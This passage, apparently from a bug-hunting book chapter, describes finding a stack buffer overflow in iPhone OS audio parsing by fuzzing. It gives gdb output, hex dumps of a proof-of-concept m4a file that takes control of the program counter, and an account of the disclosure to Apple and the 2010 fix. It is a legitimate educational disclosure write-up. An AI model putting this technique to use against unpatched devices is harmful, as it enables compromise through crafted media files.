 Locals at 0x1301bf8, Saved registers:
  r4 at 0x1301bec, r5 at 0x1301bf0, r6 at 0x1301bf4, r7
 at 0x1301bf8, r8 at                                   → 0x1301be0, sl at
 0x1301be4, fp at 0x1301be8, lr at 0x1301bfc, <strong class="userinput"><code>pc at 0x1301bfc</code></strong>,
  s16 at 0x1301ba0, s17 at 0x1301ba4, s18 at 0x1301ba8, s19 at
 0x1301bac, s20 at                    → 0x1301bb0, s21 at 0x1301bb4,
 s22 at 0x1301bb8, s23 at 0x1301bbc,
  s24 at 0x1301bc0, s25 at 0x1301bc4, s26 at 0x1301bc8, s27 at
 0x1301bcc, s28 at                    → 0x1301bd0, s29 at 0x1301bd4,
 s30 at 0x1301bd8, s31 at 0x1301bdc</pre><p>The most interesting information was the memory location where the program counter (<code class="literal">pc</code> register) was stored on the stack. As the debugger output shows, <code class="literal">pc</code> was saved at address <code class="literal">0x1301bfc</code> on the stack (see “<code class="literal">Saved registers</code>”).</p><p>I then continued the execution of the process:</p><a id="I_programlisting8_d1e9542"/><pre class="programlisting">(gdb) <strong class="userinput"><code>continue</code></strong>
Continuing.

Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_PROTECTION_FAILURE at address: 0x00000072
0x00000072 in ?? ()</pre><p>After the crash, I looked at the stack location (memory address <code class="literal">0x1301bfc</code>) where the <code class="literal">MP4AudioStream::ParseHeader()</code> function expects to find its saved program counter.</p><a id="I_programlisting8_d1e9555"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/12x 0x1301bfc</code></strong>
0x1301bfc:      0x00000073      0x00000000      0x04000001      0x0400002d
0x1301c0c:      0x00000000      0x73747328      0x00000063      0x00000000
0x1301c1c:      0x00000002      0x00000001      0x00000017      0x00000001</pre><p>The debugger output shows that the saved instruction pointer was overwritten with the value <code class="literal">0x00000073</code>. When the function tried to return to its caller function, the manipulated value was assigned to the instruction pointer (<code class="literal">pc</code> register). Specifically, the value <code class="literal">0x00000072</code> was copied into the instruction pointer instead of the file value <code class="literal">0x00000073</code> due to the instruction alignment of the ARM CPU (instruction alignment on a 16-bit or 32-bit boundary).<a id="IDX-CHP-8-0026" class="indexterm"/><a id="IDX-CHP-8-0027" class="indexterm"/></p><p>My extremely simple fuzzer had indeed found a classic stack buffer overflow in the audio libraries of the iPhone. I searched the test-case file for the byte pattern of the debugger output and found the byte sequence at file offset 500 in <span class="emphasis"><em>file40_2.m4a</em></span>:</p><a id="I_programlisting8_d1e9586"/><pre class="programlisting">000001f0h: 18 73 74 74 <span class="underline">73 00 00 00</span> 00 00 00 00 01 00 00 04 ; .stts...........
00000200h: 2D 00 00 04 00 00 00 00 28 73 74 73 63 00 00 00 ; -.......(stsc...
00000210h: 00 00 00 00 02 00 00 00 01 00 00 00 17 00 00 00 ; ................</pre><p>I then changed the underlined value above to <code class="literal">0x44444444</code> and named the new file <span class="emphasis"><em>poc.m4a</em></span>:</p><a id="I_programlisting8_d1e9599"/><pre class="programlisting">000001f0h: 18 73 74 74 <span class="underline">44 44 44 44</span> 00 00 00 00 01 00 00 04 ; .sttDDDD.........
00000200h: 2D 00 00 04 00 00 00 00 28 73 74 73 63 00 00 00 ; -.......(stsc...
00000210h: 00 00 00 00 02 00 00 00 01 00 00 00 17 00 00 00 ; ................</pre><p>I attached the debugger to <code class="literal">mediaserverd</code> again and opened the new <span class="emphasis"><em>poc.m4a</em></span> file in MobileSafari, which resulted in the following debugger output:</p><a id="I_programlisting8_d1e9612"/><pre class="programlisting">Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_INVALID_ADDRESS at address: 0x44444444
[Switching to process 77 thread 0xa20f]
<strong class="userinput"><code>0x44444444 in ?? ()</code></strong>

(gdb) <strong class="userinput"><code>info registers</code></strong>
r0             0x6474613f       1685348671
r1             0x393fc284       960479876
r2             0xcb0            3248
r3             0x10b            267
r4             0x6901102        110104834
r5             0x1808080        25198720
r6             0x2              2
r7             0x74747318       1953788696
r8             0xf40100         15991040
r9             0x817a00         8485376
sl             0xf40100         15991040
fp             0x80808005      −2139062267
ip             0x20044          131140
sp             0x684c00         6835200
lr             0x1f310          127760
<strong class="userinput"><code>pc             0x44444444</code></strong>       1145324612
cpsr           {0x60000010, n = 0x0, z = 0x1, c = 0x1, v = 0x0,
 q = 0x0, j = 0x0, ge = 0x0, e = 0x0, a = 0x0, i = 0x0, f = 0x0, t = 0x0,
 mode = 0x10}   {0x60000010, n = 0, z = 1, c = 1, v = 0, q = 0, j = 0, ge = 0,
 e = 0, a = 0, i = 0, f = 0, t = 0, mode = usr}

<strong class="userinput"><code>(gdb) backtrace</code></strong>
<strong class="userinput"><code>#0  0x44444444 in ?? ()</code></strong>
Cannot access memory at address 0x74747318</pre><p>Yay! At this point I had full control over the program counter.<a id="IDX-CHP-8-0028" class="indexterm"/></p></div>
<div class="sect1" title="8.3 Vulnerability Remediation"><div class="titlepage"><div><div><h1 class="title"><a id="vulnerability_remediation-id6"/>8.3 Vulnerability Remediation</h1></div></div></div><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Tuesday, February 2, 2010</em></span></p></div><p>I informed Apple of the bug on October 4, 2009. Today they released a new version of iPhone OS to address the vulnerability.</p><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>The vulnerability affects the iPhone as well as the iPod touch with iPhone OS prior version 3.1.3</em></span>.</p></div><p>The bug was easy to find, so I’m sure that I wasn’t the only person who knew about it, but I seem to be the only one who informed Apple. More surprising: Apple didn’t find such a trivial bug on its own.</p></div>
<div class="sect1" title="8.4 Lessons Learned"><div class="titlepage"><div><div><h1 class="title"><a id="lessons_learned-id6"/>8.4 Lessons Learned</h1></div></div></div><p>As a bug hunter and iPhone user:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Even dumb mutation-based fuzzers, like the one described in this chapter, can be quite effective.</p></li><li class="listitem"><p>Fuzzing the iPhone is tedious but worth it.</p></li><li class="listitem"><p>Do not open untrusted (media) files on your iPhone.</p></li></ul></div></div>
<div class="sect1" title="8.5 Addendum"><div class="titlepage"><div><div><h1 class="title"><a id="addendum-id6"/>8.5 Addendum</h1></div></div></div><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Tuesday, February 2, 2010</em></span></p></div><p>Since the vulnerability has been fixed and a new version of iPhone OS is available, I released a detailed security advisory on my website today.<sup>[<a href="ch08s05.html#ftn.CHP-8-FN-8" class="footnoteref">89</a>]</sup> The bug was assigned CVE-2010-0036. <a class="xref" href="ch08s05.html#timeline_from_the_time_i_notified" title="Figure 8-3. Timeline from the time I notified Apple until I released a security advisory">Figure 8-3</a> shows a timeline of how the vulnerability was addressed.</p><div class="figure"><a id="timeline_from_the_time_i_notified"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject8_d1e9683"/><img src="httpatomoreillycomsourcenostarchimages939335.png.jpg" alt="Timeline from the time I notified Apple until I released a security advisory"/></div></div><p class="title">Figure 8-3. Timeline from the time I notified Apple until I released a security advisory</p></div><div class="sect2" title="Notes"><div class="titlepage"><div><div><h2 class="title"><a id="notes-id7"/>Notes</h2></div></div></div><p><sup>[<a id="CHP-8-FN-1" href="#ftn.CHP-8-FN-1" class="footnote">82</a>]</sup></p><p><sup>[<a id="CHP-8-FN-2" href="#ftn.CHP-8-FN-2" class="footnote">83</a>]</sup></p><p><sup>[<a id="CHP-8-FN-3" href="#ftn.CHP-8-FN-3" class="footnote">84</a>]</sup></p><p><sup>[<a id="CHP-8-FN-4" href="#ftn.CHP-8-FN-4" class="footnote">85</a>]</sup></p><p><sup>[<a id="CHP-8-FN-5" href="#ftn.CHP-8-FN-5" class="footnote">86</a>]</sup></p><p><sup>[<a id="CHP-8-FN-6" href="#ftn.CHP-8-FN-6" class="footnote">87</a>]</sup></p><p><sup>[<a id="CHP-8-FN-7" href="#ftn.CHP-8-FN-7" class="footnote">88</a>]</sup></p><p><sup>[<a id="CHP-8-FN-8" href="#ftn.CHP-8-FN-8" class="footnote">89</a>]</sup><a id="IDX-CHP-8-0029" class="indexterm"/></p></div><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a id="ftn.CHP-8-FN-1" href="#CHP-8-FN-1" class="para">82</a>] </sup>See <a class="ulink" href="http://en.wikipedia.org/wiki/IOS_jailbreaking">http://en.wikipedia.org/wiki/IOS_jailbreaking</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-8-FN-2" href="#CHP-8-FN-2" class="para">83</a>] </sup>See <a class="ulink" href="http://cydia.saurik.com/">http://cydia.saurik.com/</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-8-FN-3" href="#CHP-8-FN-3" class="para">84</a>] </sup>See “iOS Developer Library: Core Audio Overview” at <a class="ulink" href="http://developer.apple.com/library/ios/#documentation/MusicAudio/Conceptual/CoreAudioOverview/Introduction/Introduction.html">http://developer.apple.com/library/ios/#documentation/MusicAudio/Conceptual/CoreAudioOverview/Introduction/Introduction.html</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-8-FN-4" href="#CHP-8-FN-4" class="para">85</a>] </sup>See “iOS Developer Library: Audio Toolbox Framework Reference” at <a class="ulink" href="http://developer.apple.com/library/ios/#documentation/MusicAudio/Reference/CAAudioTooboxRef/_index.html">http://developer.apple.com/library/ios/#documentation/MusicAudio/Reference/CAAudioTooboxRef/_index.html</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-8-FN-5" href="#CHP-8-FN-5" class="para">86</a>] </sup>See <a class="ulink" href="http://en.wikipedia.org/wiki/Advanced_Audio_Coding">http://en.wikipedia.org/wiki/Advanced_Audio_Coding</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-8-FN-6" href="#CHP-8-FN-6" class="para">87</a>] </sup>See <a class="ulink" href="http://ericasadun.com/ftp/EricaUtilities/">http://ericasadun.com/ftp/EricaUtilities/</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-8-FN-7" href="#CHP-8-FN-7" class="para">88</a>] </sup>The QuickTime File Format Specification is available at <a class="ulink" href="http://developer.apple.com/mac/library/documentation/QuickTime/QTFF/QTFFPreface/qtffPreface.html">http://developer.apple.com/mac/library/documentation/QuickTime/QTFF/QTFFPreface/qtffPreface.html</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-8-FN-8" href="#CHP-8-FN-8" class="para">89</a>] </sup>My security advisory that describes the details of the iPhone vulnerability can be found at <a class="ulink" href="http://www.trapkit.de/advisories/TKADV2010-002.txt">http://www.trapkit.de/advisories/TKADV2010-002.txt</a>.</p></div></div></div></body></html>